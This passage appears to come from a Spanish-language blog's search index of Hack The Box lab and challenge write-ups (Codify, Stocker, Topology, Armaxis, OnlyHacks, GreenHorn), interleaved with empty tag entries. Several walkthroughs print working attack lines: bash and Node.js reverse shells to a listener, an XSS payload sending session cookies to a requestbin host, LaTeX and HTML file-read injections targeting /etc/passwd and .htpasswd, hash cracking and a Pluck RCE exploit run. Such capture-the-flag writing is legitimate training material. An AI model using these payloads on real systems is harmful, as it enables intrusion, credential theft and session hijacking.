la pagina RevShells y en nuestra poc ejecutaremos el siguiente comando:\n#Primero ponte en escucha en tu maquina (el siguiente comando) bash -c \u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/IP/PUERTO 0\u0026gt;\u0026amp;1\u0026#34; Y nos pondremos en escucha con netcat en nuestra maquina local:\nnc -lvnp PUERTO Ya con esto le pediremos a la pagina que ejecute nuestro codigo.\nListo lo primero es hacer el tratamiento de la tty:\nscript /dev/null -c bash Ctrl + Z stty raw -echo; fg reset xterm export TERM=xterm Ya en esta parte con find podemos encontrar una base de datos:\nfind /var/www/ -name *.db 2\u0026gt;/dev/null Y veremos que hay una base de datos, usando file nos daremos cuenta que es una base de datos sqlite:\nCon esto podremos ver la base de datos que dentro tiene un hash:\nY con el siguiente comando de hashcat podremos obtener la contraseña para ingresar como joshua:\nhashcat hash.txt --wordlist /usr/share/wordlist/rockyou.txt -m 3200 Root #\rEnumerando encontramos este script que tenemos permiso de ejecutar como sudo:\nSi vemos el script esta mal montado por lo que cuando pida la contraseña podemos usar el * y nos dira que es correcto esto debido a que si no usamos dobles comillas para esas variables DB_PASS y USER_PASS podemos usar el * de forma que sin importar cual se la contraseña nos la dara como correcta esto tambien nos habilita la opcion de obtener la contraseña con python. Aquí un ejemplo de porque esto pasa:\nPara poder interceptar la contraseña vamos a usar pspy igual que en las anteriores maquinas que lo hemos usado.\nY ahi tenemos la contraseña.\nSi tienen curiosiodad de como se hacia mediante el script de python pueden ver esta parte del directo de s4vitar.\n","date":"7 marzo 2025","externalUrl":null,"permalink":"/htb/maquinas/codify/","section":"Hack The Box","summary":"","title":"Codify","type":"maquinas"},{"content":"","date":"7 marzo 2025","externalUrl":null,"permalink":"/tags/nodejs/","section":"Tags","summary":"","title":"Nodejs","type":"tags"},{"content":"","date":"7 marzo 2025","externalUrl":null,"permalink":"/tags/pspy/","section":"Tags","summary":"","title":"Pspy","type":"tags"},{"content":"","date":"7 marzo 2025","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"","date":"7 marzo 2025","externalUrl":null,"permalink":"/tags/sqlite3/","section":"Tags","summary":"","title":"Sqlite3","type":"tags"},{"content":"","date":"7 marzo 2025","externalUrl":null,"permalink":"/tags/sudoers/","section":"Tags","summary":"","title":"Sudoers","type":"tags"},{"content":"","date":"7 marzo 2025","externalUrl":null,"permalink":"/tags/vm2/","section":"Tags","summary":"","title":"Vm2","type":"tags"},{"content":"\r¿Qué son las Máquinas en Hack The Box? #\rLas Máquinas en Hack The Box son entornos virtuales que simulan sistemas reales con vulnerabilidades. El objetivo es explotar estas vulnerabilidades para obtener acceso al sistema y escalar privilegios hasta convertirte en root o administrador. Cada máquina tiene un nivel de dificultad (fácil, medio, difícil) y cubre una amplia gama de técnicas, como:\nEscaneo de puertos y enumeración de servicios. Explotación de vulnerabilidades conocidas. Escalada de privilegios. Uso de herramientas como Nmap, Metasploit, Burp Suite, entre otras. ¿Qué son los Challenges en Hack The Box? #\rLos Challenges son desafíos independientes que se centran en habilidades específicas, como:\nCriptografía: Descifrar mensajes o romper algoritmos. Reversing: Analizar y entender el funcionamiento de binarios. Web Exploitation: Explotar vulnerabilidades en aplicaciones web. Forensics: Analizar datos para encontrar información oculta. OSINT: Recopilar información de fuentes abiertas. Estos desafíos son ideales para practicar habilidades específicas y aprender nuevas técnicas.\nMis Páginas de Challenges y Máquinas #\r","date":"22 febrero 2025","externalUrl":null,"permalink":"/htb/","section":"Hack The Box","summary":"","title":"Hack The Box","type":"page"},{"content":"","date":"22 febrero 2025","externalUrl":null,"permalink":"/tags/burpsuit/","section":"Tags","summary":"","title":"Burpsuit","type":"tags"},{"content":"","date":"22 febrero 2025","externalUrl":null,"permalink":"/tags/inyecci%C3%B3n-nosql/","section":"Tags","summary":"","title":"Inyección-NoSQL","type":"tags"},{"content":"","date":"22 febrero 2025","externalUrl":null,"permalink":"/tags/pdf-dinamico/","section":"Tags","summary":"","title":"PDF-Dinamico","type":"tags"},{"content":"","date":"22 febrero 2025","externalUrl":null,"permalink":"/tags/server-side/","section":"Tags","summary":"","title":"Server-Side","type":"tags"},{"content":"\rDescripción: #\rMaquina sencilla que mediante una inyección NoSQL podemos saltar un login y luego mediante un generador de PDF’s dinamicos listar archivos y hallat credenciales, en la escalada explotamos un permiso de sudoers Node\nEnumeración #\rsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allPorts Esto nos mostrara que hay dos puertos el 22 y el 80.\nwhatweb IP Vemos el dominio que es stocker.htb lo agregamos al /etc/hosts y continuamos con el escaneo de puertos.\nnmap -p22,80 -sVC 10.129.184.222 -A -oN target Vamos a listar subdominios a ver si encontramos algo interesante\n\u0026lt;img src=\\\u0026#34;x\\\u0026#34; onerror=\\\u0026#34;document.write(\u0026#39;\u0026lt;iframe src=file:///etc/passwd width=100% height=100%\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;)\\\u0026#34; /\u0026gt; Solo hay dos usuarios con shell root y angoose, ahora vamos a empezar a listar archivos del subdominio dev.stocker.htb suponiendo que por lo general esta en /var/www/dev/ si listamos el index.js:\nHay lo que podria ser una contraseña de lo que parece ser el usuario dev pero si recordamos no hay ningun usuario dev por lo que vamos a probar la contraseña con angoose y nos funcionara mediante ssh.\nRoot #\rDespues de conectarnos hacemos el tratamiento de la tty mas basico:\nexport TERM=xterm Listando permisos con sudo -l, y tenemos que hay un binario que podemos ejecutar que es node\nVemos que solo podemos ejecutar los archivos de extension js en la carpeta /usr/local/scripts/ pero podemos tratar de hacer un directory traversal por lo que lo primero que vamos a hacer es entrar a https://www.revshells.com/ y mirar la shell #2 que tienen para node\ncd /tmp nano rev.js (function(){ var net = require(\u0026#34;net\u0026#34;), cp = require(\u0026#34;child_process\u0026#34;), sh = cp.spawn(\u0026#34;sh\u0026#34;, []); var client = new net.Socket(); client.connect(4444, \u0026#34;IP\u0026#34;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application from crashing })(); Ahora lo que vamos a hacer es poner nuestra maquina en escucha y tartar de ejecutar el binario con los permisos sudo.\n#Atacante nc -lvnp 4444 #Victima sudo node /usr/local/scripts/../../../../tmp/rev.js Y con esto terminamos la maquina.\n","date":"22 febrero 2025","externalUrl":null,"permalink":"/htb/maquinas/stocker/","section":"Hack The Box","summary":"","title":"Stocker","type":"maquinas"},{"content":"Tenemos una url con dos puertos por lo que vamos a visitar los dos a ver que contienen.\nVemos como tenemos acceso a una bandeja de un correo y en el otro puerto tenemos la opcion de registrar usuarios ingresar y recuperar la contraseña.\nRevisando el codigo fuente nos damos cuenta que la recuperacion de contraseña no esta bien pensada y es vulnerable a un IDOR porque si bien pide un token y verifica que el token sea valido no verifica a quien le pertenece el token, con este en conocimiento le podemos cambiar la contraseña a cualquier usuario.\nVamos a tratar de hallar algun correo de administrador en el codigo fuente usando grep:\ngrep -r admin Solicitamos el cambio de contraseña despues de crear un usuario con el correo que nos dieron:\nY hacemos el cambio de contraseña para el usuario administrador:\nAhora con eso podemos iniciar sesion como administradores y veremos que tenemos acceso a un funcion para mostrar “weapons”\nTambien vemos que en la nota acepta markdown por lo que podemos tratar de hacer una inyección para obtener la flag.\nimg[!](file:///flag.txt) Si pasamos lo que nos muestra el codigo fuente a un decoder de base64 nos dara la flag.\n","date":"21 febrero 2025","externalUrl":null,"permalink":"/htb/challenges/armaxis/","section":"Hack The Box","summary":"","title":"Armaxis","type":"challenges"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/crontabs/","section":"Tags","summary":"","title":"Crontabs","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/file-read/","section":"Tags","summary":"","title":"File-Read","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/gnuplot/","section":"Tags","summary":"","title":"Gnuplot","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/idor/","section":"Tags","summary":"","title":"IDOR","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/latex/","section":"Tags","summary":"","title":"Latex","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/subdominio/","section":"Tags","summary":"","title":"Subdominio","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/sudo/","section":"Tags","summary":"","title":"Sudo","type":"tags"},{"content":"\rDescripción: #\rUna máquina en la que tenemos que hacer una inyección LaTeX para poder leer archivos y así conseguir el hash del usuario, para luego, mediante una tarea recurrente, ganar root.\nEnumeración #\rsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allPorts -p- Escanea todos los puertos 1-65535 . —open Solo muestra los puertos que estén abiertos. -sS Stealt scan, cambia el modo de escane haciendo que no se complete el hanshake. —min-rate 5000 Como mínimo va a enviar 5000 paquetes por segundo. -vvv Aumenta la verbosidad, mostrando la máxima informacion posible mientras se ejecuta. -n Desactiva la resolucion DNS; no va a tratar de resolver los nombres de dominio. -Pn Nmap por defecto manda un ping a la IP; esto lo desactiva. -oG allPorts Guarda el escaneo en formato oG en el archivo llamado allPorts. Este escaneo nos dio dos puertos: el 22 y el 80. Vamos a hacer un escaneo más exhaustivo a estos puertos.\nsudo nmap -sCV -p22,80 IP -A -oN target -sCV Esto ejecuta una serie de scripts predeterminados de Nmap para obtener información adicional sobre los servicios que se encuentran abiertos, como versiones de servicios, detalles del sistema operativo, vulnerabilidades conocidas y la versión exacta. -p22, 80 Especifica qué puertos se van a escanear. -A Activa el descubrimiento de sistema operativo, la deteccion de version, script scanning y hace un traceroute. La pagina HTTP que está en el puerto 80 usa Apache 2.4.41.\nPuerto 80 #\rAl momento de entrar al link “Latex Equation Generator” veremos que es un subdmonio por lo que tendremos que agregarlo al /etc/hosts para que nos muestre lo siguiente.\nAlgo que podemos tratar es listar los archivos dentro de este subdmonio por lo que vamos a ingresar a la siguiente URL dejando el ultimo / .\nRevisando los archivos, lo único útil está en equationtest.tex ya que nos muestra cómo estan tratando la entrada Latex la web.\n\\documentclass{standalone} \\input{header} \\begin{document} $ \\int_{a}^b\\int_{c}^d f(x,y)dxdy $ \\end{document} Podemos observar que la entrada está entre los signos de dólar. Leyendo la página, nos dicen que LaTeX está en el modo “inline math”. Buscando acerca de este modo, nos encontramos con que hay tres formas de tratarlo:\n$ . . .$ \\begin{math} . . . \\end{math} ( . . . ) Foothold #\rPor lo que ahora sabemos porque está entre esos signos y confirmamos que la entrada va a estar así planeando una inyección.\nPayloadsAllTheThings\nVamos a tratar de empezar a leer archivos del sistema con la inyección de codigo.\n$ \\lstinputlisting{/etc/passwd} $ Una vez confirmamos que podemos leer archivos vamos a empezar a leer archivos de configuración que nos permitán ingresar al sistema.\n$ \\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf} $ En este archivo encontramos varios directorios entre ellos uno que pertence al subdominio dev.topology.htb lo agregamos al /etc/hosts y al ingresar nos pide una contraseña.\nVamos a listar archivos de configuracion por defecto de apache sobre el directorio correspondiente a este subdominio.\n$ \\lstinputlisting{/var/www/dev/.htaccess} $ Por ultimo vamos a listar este archivo.\n$ \\lstinputlisting{/var/www/dev/.htpasswd} $ Nos vamos a encontrar un usuario junto con su hash, vamos a copiarlo y guardarlo en un archivo .txt para hacerle fuerza bruta con hashcat:\nhashcat hash.txt --wordlist /usr/share/wordlist/rockyou.txt --user Esto nos dara su contraseña para iniciar sesion mediante ssh.\nRoot #\rEnumeración #\rPrimero vamos a hacer el tratamiento basico de la shell:\nexport TERM=xterm Listo ahora vamos a tratar de listar archivos y permisos a ver si encontramos algo, pero nos daremos cuenta rapidamente que no tenemos permitido el uso de sudo ni ningun permiso extraño por lo que lo unico que puede tener algo interesante son las crontab pero no nos permiten listarlas entonces vamos a usar la herramienta Pspy.\n#Maquina atacante python3 -m http.server 80 #Maquina victima wget IP/pspy64 chmod +x pspy64 ./pspy64 Luego de ejecutar el ultimo comando si esperamos un rato podremos ver que hay una script que se ejecuta cada minuto /opt/gnuplot/getdata.sh .\nSi analizamos esta salida nos daremos cuenta que lo que se esta haciendo cada minuto es buscar en el directorio /opt/gnuplot/ todos los archivos con extension plt y los ejecuta.\nSi tratamos de ingresar al directorio no nos lo permite pero en cambio si creamos un archivo y lo movemos a esa direccion no habra ningun conflicto. Buscando escalaciones de privilegios con gnuplot que es el binario que se ejecuta encontramos la siguiente Exploit.\n#Maquina atacante nc -lvnp 4444 #Maquina victima nano rev.plt system \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/IP/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; mv rev.plt /opt/gnuplot/ Con esto tendremos acceso como root y habremos completado la maquina.\n","date":"21 febrero 2025","externalUrl":null,"permalink":"/htb/maquinas/topology/","section":"Hack The Box","summary":"","title":"Topology","type":"maquinas"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"Al ingresar a la url tenemos la opcion de registrarnos e iniciar sesión que es lo primero que vamos a hacer.\nDentro podremos ver una web de citas en la que la unica persona interesante es Renata, esto debido a que nos dice que siempre esta conectada, por lo que le vamos a dar match y vamos a hablar con ella.\nEn este punto hay dos formas de resolver la maquina una es haciendo un Cross-Site-Scripting y la otra es modifcando la url debido a que podemos ver que cada chat tiene un id.\nVamos a mostrar la primera si tratamos de usar un titulo html en la conversacion con renata este respondera al contenido:\n\u0026lt;h1\u0026gt;Hi\u0026lt;/h1\u0026gt; Vamos a tratar de conseguir la cookie de su sesion con el siguiente comando:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://requestbinLink? c=\u0026#39;+document.cookie\u0026lt;/script\u0026gt; Vamos a ir a esta pagina http://requestbin.whapi.cloud/ crearemos una nueva request y remplazaremos la url en el comando, si hace click en el link y recargamos la pagina de la request tendremos lo siguiente:\nRemplazaremos esa cookie en el navegador usando inspeccionar y podremos ver los chats de renata junto con la flag.\nAhora vamos con la segunda forma, cuando entramos al chat de renata podemos ver como la url es:\nhttp://94.237.55.96:37246/chat/?rid=6 Si cambiamos el valor del seis podremos ver otros chats hay una forma de probar esto de manera automatica con ffuf para verificar que sea un IDOR:\n#Creamos el diccionario sed 1 100 \u0026gt; id.txt ffuf -w id.txt -u \u0026#39;http://94.237.55.96:37246/chat/?rid=FUZZ\u0026#39; -H \u0026#34;Cookie: session=TUCOOKIE\u0026#34; -mc 200 Esto nos devolvio dos posibles chats pero uno es el nuestro por lo que si probamos con el otro tendremos nuevamente la flag.\n","date":"20 febrero 2025","externalUrl":null,"permalink":"/htb/challenges/onlyhacks/","section":"Hack The Box","summary":"","title":"OnlyHacks","type":"challenges"},{"content":"","date":"30 noviembre 2024","externalUrl":null,"permalink":"/tags/cve/","section":"Tags","summary":"","title":"CVE","type":"tags"},{"content":"\rDescripción : #\rUna máquina bastante sencilla en la que la enumeración es la clave para hallar la primera contraseña, que te servirá para usar un CVE y obtener una shell. Ya para el escalamiento de privilegios, algo absurdo y poco útil, pero entretenido.\nEnumeración #\rComo siempre, vamos a empezar descubriendo qué puertos hay y con qué servicios.\nsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allports nmap -sCV -p80,22,3000 IP -oN target Vemos una página en el puerto 80, por lo que vamos a agregar la IP al /etc/hosts.\nCuando abrimos la página, vemos que en la parte inferior dice \u0026ldquo;admin\u0026rdquo;. Si le damos clic, nos lleva a un inicio de sesión. Dejaremos esto para más adelante.\nAhora vamos a revisar la página, pero por el puerto 3000. Después de buscar un rato, encontramos una especie de repositorio. Si revisamos estos archivos, encontramos un archivo llamado pass.php.\nEsto nos deja un hash que, si usamos un hash identifier, nos dice que es un SHA-512. Por lo tanto, con John the Ripper lo podemos decodificar.\njohn --format=Raw-SHA512 hash.txt /usr/share/wordlist/rockyou.txt Si volvemos al login que habíamos encontrado y usamos esta contraseña, nos permite iniciar sesión. Si miramos qué tecnologías tiene la página, nos damos cuenta de que tiene un Pluck 4.7.18, que tiene un CVE que podemos explotar con la contraseña que encontramos. Si copiamos este exploit de GitHub, podemos obtener una shell.\nPrimero, vamos a crear un entorno virtual de Python:\npython -m venv \u0026#34;Enviroment name\u0026#34; source \u0026#34;Enviroment name\u0026#34;/bin/activate E instalamos este módulo para que el script de GitHub funcione sin problemas:\npip3 install requests_toolbelt Ahora ponemos un nc en escucha y ejecutamos el script con sus parámetros:\nnc -lvnp 4444 python3 exploit_pluckv4.7.18_RCE.py --password iloveyou1 --ip 10.10.16.47 --port 4444 --host http://greenhorn.htb Y con esto tenemos una shell:\nSi tratamos de cambiar a uno de los dos usuarios, no vamos a encontrar forma de hacerlo. Por lo tanto, al final tratamos de usar la misma contraseña con el usuario Junior y nos funcionó.\nSi miramos dentro de la carpeta de Junior, hallamos dos cosas: un PDF y la flag. Vamos a montar un servidor HTTP con Python para llevar ese PDF a nuestra máquina.\npython3 -m http.server [puerto] wget http://IP:[puerto]/\u0026#39;Using OpenVAS.pdf\u0026#39; Dentro del pdf nos encontramos una especie de carta con una contraseña difuminada\nSi buscamos formas de conseguir esta contraseña nos vamos a encontrar este github Depix, ya viendo esto vamos a hacer dos cosas clonar el repositorio y extraer la imagen del pdf en una pagina que nos permita esto, para luego descifrar la contraseña.\ngit clone https://github.com/spipm/Depix python3 depix.py -p ../imagen-pdf -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png ","date":"30 noviembre 2024","externalUrl":null,"permalink":"/htb/maquinas/greenhorn/","section":"Hack The Box","summary":"","title":"GreenHorn","type":"maquinas"},{"content":"","date":"30 noviembre 2024","externalUrl":null,"permalink":"/tags/pluk/","section":"Tags","summary":"","title":"Pluk","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]